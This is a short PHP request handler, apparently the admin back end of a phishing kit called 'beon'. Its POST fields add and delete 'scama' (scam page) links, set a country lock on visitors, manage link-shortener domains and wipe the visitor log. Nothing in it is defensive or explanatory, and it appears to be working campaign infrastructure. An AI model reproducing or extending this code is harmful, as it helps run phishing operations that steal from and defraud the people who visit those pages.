<?php

require_once('../core/beon_core.php');

if ($_POST['mode']) {
    updateMode($_POST['mode']);
}

if ($_POST['link']) {
    insertScama($_POST['link']);
}

if ($_POST['code_country']) {
    updateCountryLock($_POST['code_country']);
}

if ($_POST['id_sc']) {
    delScama($_POST['id_sc']);
}

if ($_POST['short']) {
    insertDomainShort($_POST['short']);
}

if ($_POST['id_short']) {
    delDomainShort($_POST['id_short']);
}

if ($_POST['clearz']) {
    truncateVisitor();
}
